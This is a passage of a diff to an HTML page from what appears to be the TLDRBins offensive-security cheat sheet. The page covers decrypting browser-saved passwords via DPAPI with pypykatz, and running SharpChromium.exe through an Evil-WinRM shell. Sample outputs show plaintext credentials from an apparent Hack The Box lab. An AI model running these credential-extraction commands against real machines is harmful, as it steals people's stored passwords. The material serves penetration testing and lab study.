+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 decode
 </span></span><span class="line"><span class="cl"><span class="go">cat masterkey_guid_b64 | base64 -d &gt; masterkey_guid
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat masterkey_guid_b64 <span class="p">|</span> base64 -d &gt; masterkey_guid
-</span></span></code></pre></div><h4 id="3-decrypt">3. Decrypt</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password &lt;SID&gt; &#39;&lt;PASSWORD&gt;&#39; | tee pkf
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi prekey password S-1-5-21-1844305427-4058123335-2739572863-2761 <span class="s1">&#39;!@p%i&amp;J#iNNo1T2&#39;</span> <span class="p">|</span> tee pkf
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> cat masterkey_guid_b64 <span class="p">|</span> base64 -d &gt; masterkey_guid
+</span></span></div></pre></div><h4 id="3-decrypt">3. Decrypt</h4>
+<div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi prekey password <span class="o">&lt;SID&gt;</span> '<span class="o">&lt;PASSWORD&gt;</span>' | tee pkf
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi prekey password S-1-5-21-1844305427-4058123335-2739572863-2761 <span class="s1">'!@p%i&amp;J#iNNo1T2'</span> <span class="p">|</span> tee pkf
 </span></span><span class="line"><span class="cl"><span class="go">4ea57b2e9e19cb91226b1ce0f64e4edad3d56c82
 </span></span></span><span class="line"><span class="cl"><span class="go">0fcd9d392606c1dbf84c875dcfad678ca56cb607
 </span></span></span><span class="line"><span class="cl"><span class="go">202e6812a189277e0ccd0bc72dcfdd4ed6e9469e
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey masterkey_guid pkf -o mkf
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi masterkey masterkey_guid pkf -o mkf
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi chrome --logindata logindata mkf localstate.json
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi chrome --logindata logindata mkf localstate.json
-</span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.wood@windcorp.htb pass: b&#39;SemTro\xc2\xa432756Gff&#39; url: http://somewhere.com/action_page.php
-</span></span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.wood@windcorp.htb pass: b&#39;SomeSecurePasswordIGuess!09&#39; url: http://google.com/action_page.php
-</span></span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.woodADM@windcorp.com pass: b&#39;smeT-Worg-wer-m024&#39; url: http://webmail.windcorp.com/action_page.php
-</span></span></span></code></pre></div></div>
-
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpChromium.exe logins
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\debug\wia&gt; .\SharpChromium.exe logins
+</span></span></span></div></pre></div><div class="highlight codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi masterkey masterkey_guid pkf -o mkf
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi masterkey masterkey_guid pkf -o mkf
+</span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">pypykatz dpapi chrome --logindata logindata mkf localstate.json
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> pypykatz dpapi chrome --logindata logindata mkf localstate.json
+</span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.wood@windcorp.htb pass: b'SemTro\xc2\xa432756Gff' url: http://somewhere.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.wood@windcorp.htb pass: b'SomeSecurePasswordIGuess!09' url: http://google.com/action_page.php
+</span></span></span><span class="line"><span class="cl"><span class="go">file: logindata user: bob.woodADM@windcorp.com pass: b'smeT-Worg-wer-m024' url: http://webmail.windcorp.com/action_page.php
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\SharpChromium.exe logins
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\windows\debug\wia&gt; .\SharpChromium.exe logins
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Beginning Edge extraction.
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">--- Chromium Credential (User: Bob.Wood) ---
@@ -979,16 +984,17 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Finished Edge extraction.
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Done.
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe">SharpChromium.exe</a></em></small></p></div></p>
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe">SharpChromium.exe</a></em></small></p></div></div>
 
-</div></div>
-    
-    <script type="module" src="/js/main.js"></script>
-    <footer>
-    <hr>
-    <div class="footer-text">
-        <div>© 2025 TLDRBins</div>
-    </div>
+<p></p>
+
+</div>
+</main>
+<script type="module" src="/js/main.js"></script>
+<footer>
+  <hr>
+  <div>© 2025 TLDRBins</div>
 </footer>
-</body>
-</html>
+
+
+</body></html>
